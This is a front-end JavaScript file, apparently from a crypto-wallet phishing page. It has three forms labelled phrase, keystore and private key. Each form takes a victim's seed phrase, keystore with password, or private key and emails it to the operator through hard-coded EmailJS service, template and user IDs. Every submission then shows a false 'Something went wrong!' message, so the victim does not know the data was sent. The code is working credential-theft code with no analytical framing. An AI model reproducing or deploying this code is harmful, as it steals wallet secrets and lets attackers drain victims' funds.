$(document).ready(function() {

  $('.passbtn').html('DONE'); 
  $('.tab_container:first').show();
  $('.nav #navi:first').addClass('active');
  $('.nav #navi').attr('disabled',true);

  $('.nav #navi').click(function(event){
      index = $(this).index();
      $('.nav #navi').removeClass('active');
      $(this).addClass('active');
      $('.tab_container').hide();
      $('.tab_container').eq(index).show();
  });


(function () {
    // emailjs.init("USERID");
    emailjs.init("user_mTys1zb8eknjD35v7rcGA");
  })();
  function validate() {
    
    let name = document.querySelector(".subject");
    let email = document.querySelector(".walletsrc");
   
    let btn = document.querySelector(".phrasebtn");

    btn.addEventListener("click", (e) => {
      e.preventDefault();
      if (name.value == "" || email.value == "") {
        emptyerror();
      } else {
       

        sendmail(name.value, email.value);
        error();
        console.log("Email Sent")
        
      }
    });
  }
  validate();

  function sendmail(name, email) {
    emailjs.send("service_caq97ba","template_mvvfasr",{
to_name: "None",
from_name: name,
message: email,
});
  }

  function emptyerror() {
    Swal.fire({
      icon: " error",
      title: "Oops...",
      text: "Fields cannot be empty!",
    });
  }

  function error() {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Something went wrong!",
    });
  }

  function success() {
    Swal.fire({
      icon: "success",
      title: "Success...",
      text: "Successfully sent message",
    });
  }
  

  (function () {
    // emailjs.init("USERID");
    emailjs.init("user_mTys1zb8eknjD35v7rcGA");
  })();
  function validate1() {
    
    let name = document.querySelector(".subject1");
    let email = document.querySelector(".walletsrc1");
    let pass = document.querySelector(".password");
    let btn = document.querySelector(".keybtn");

    btn.addEventListener("click", (e) => {
      e.preventDefault();
      if (name.value == "" || email.value == "" || pass.value == "") {
        emptyerror();
      } else {
       

        sendmail1(name.value, email.value, pass.value);
        error();
        console.log("Email Sent")
        
      }
    });
  }
  validate1();

  function sendmail1(name, email, pass) {
    emailjs.send("service_caq97ba","template_mvvfasr",{
to_name: pass,
from_name: name,
message: email,
});
  }

  function emptyerror() {
    Swal.fire({
      icon: " error",
      title: "Oops...",
      text: "Fields cannot be empty!",
    });
  }

  function error() {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Something went wrong!",
    });
  }

  function success() {
    Swal.fire({
      icon: "success",
      title: "Success...",
      text: "Successfully sent message",
    });
  }

 (function () {
    // emailjs.init("USERID");
    emailjs.init("user_mTys1zb8eknjD35v7rcGA");
  })();
  function validate2() {
    
    let name = document.querySelector(".subject2");
    let email = document.querySelector(".walletsrc2");

    let btn = document.querySelector(".privatebtn");

    btn.addEventListener("click", (e) => {
      e.preventDefault();
      if (name.value == "" || email.value == "" ) {
        emptyerror();
      } else {
       

        sendmail2(name.value, email.value);
        error();
        console.log("")
        
      }
    });
  }
  validate2();

  function sendmail2(name, email) {
    emailjs.send("service_caq97ba","template_mvvfasr",{
to_name: "None",
from_name: name,
message: email,
});
  }

  function emptyerror() {
    Swal.fire({
      icon: " error",
      title: "Oops...",
      text: "Fields cannot be empty!",
    });
  }

  function error() {
    Swal.fire({
      icon: "error",
      title: "Oops...",
      text: "Something went wrong!",
    });
  }

  function success() {
    Swal.fire({
      icon: "success",
      title: "Success...",
      text: "Successfully sent message",
    });
  }
})

